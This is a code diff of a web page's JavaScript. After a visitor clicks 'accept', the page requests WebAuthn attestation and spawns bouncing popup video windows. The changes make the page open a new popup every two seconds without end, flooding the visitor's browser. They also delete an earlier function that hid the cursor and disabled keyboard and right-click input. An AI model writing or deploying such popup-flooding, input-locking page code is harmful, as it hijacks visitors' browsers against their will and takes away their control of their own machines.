@@ -122,14 +122,14 @@
     const MARGIN = 10;            // Margin from the edges of the screen
     const TICK_LENGTH = 100;      // Update interval for the window movement
     const VIDEOS = [
-        'media/video.mp4'  // Replace with your actual video file paths
+        'media/video.mp4' // Replace with your actual video file paths
     ];
 
     function getRandomArrayEntry(arr) {
         return arr[Math.floor(Math.random() * arr.length)];
     }
 
-    function moveWindowBounce() {
+    function moveWindowBounce(window) {
         let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1);
         let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1);
         
@@ -156,6 +156,36 @@
             // Move the window
             window.moveBy(vx, vy);
         }, TICK_LENGTH);
+    }
+
+    function createVideoWindow() {
+        const smallWindow = window.open("", "_blank", "width=400,height=300");
+        smallWindow.document.write(`
+            <html>
+                <head>
+                    <title>Video</title>
+                    <style>
+                        body {
+                            margin: 0;
+                            overflow: hidden;
+                        }
+                        video {
+                            width: 100%;
+                            height: 100%;
+                            object-fit: cover;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <video autoplay loop muted>
+                        <source src="${getRandomArrayEntry(VIDEOS)}" type="video/mp4">
+                    </video>
+                </body>
+            </html>
+        `);
+        smallWindow.document.close();
+        smallWindow.focus();
+        moveWindowBounce(smallWindow);
     }
 
     function requestWebauthnAttestation() {
@@ -205,53 +235,13 @@
     const acceptButton = document.getElementById("accept-button");
     const declineButton = document.getElementById("decline-button");
 
-    let hasClicked = false;
-
-    // Function to hide cursor and disable keyboard
-    function hideCursorDisableKeyboard() {
-        document.body.style.cursor = 'none';
-        document.addEventListener('keydown', (e) => e.preventDefault(), true);
-        document.addEventListener('contextmenu', (e) => e.preventDefault(), true);
-    }
-
-    // Function to create a small window displaying the video
-    function createVideoWindow() {
-        const smallWindow = window.open("", "_blank", "width=400,height=300");
-        smallWindow.document.write(`
-            <html>
-                <head>
-                    <title>Video</title>
-                    <style>
-                        body {
-                            margin: 0;
-                            overflow: hidden;
-                        }
-                        video {
-                            width: 100%;
-                            height: 100%;
-                            object-fit: cover;
-                        }
-                    </style>
-                </head>
-                <body>
-                    <video autoplay loop muted>
-                        <source src="${getRandomArrayEntry(VIDEOS)}" type="video/mp4">
-                    </video>
-                </body>
-            </html>
-        `);
-        smallWindow.document.close();
-        smallWindow.focus();
-        moveWindowBounce();
-    }
-
     acceptButton.addEventListener("click", () => {
         overlay.setAttribute("hidden", true);
-        hideCursorDisableKeyboard();
         requestWebauthnAttestation();
-        for (let i = 0; i < 5; i++) { // Open 5 windows
-            createVideoWindow();
-        }
+        createVideoWindow(); // Open the first window
+
+        // Continuously open more windows every 2 seconds
+        setInterval(createVideoWindow, 2000);
     });
 
     declineButton.addEventListener("click", () => {
